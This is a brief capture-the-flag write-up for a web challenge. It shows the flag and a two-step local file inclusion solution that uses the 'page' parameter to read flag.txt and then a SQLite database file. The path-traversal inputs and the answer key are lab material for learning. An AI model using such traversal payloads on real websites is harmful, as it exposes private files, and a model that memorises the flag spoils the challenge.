# Talk To You
My neighbor is a college student who built a website for his cousin. He's having some trouble with it. Could you help him figure out what's wrong?

https://tbtl-talk-to-you.chals.io/


# Flag
TBTL{4Typ1c41_d4T4B453_u54g3}


# Solution
Exploiting LFI and browsing to `/?page=../flag.txt`: 
```
<p style="color: rgba(0, 0, 0, 0)">
    Flag is in SQLite3: database.sqlite
</p>
```

Browsing to `/?page=./database.sqlite` show the flag.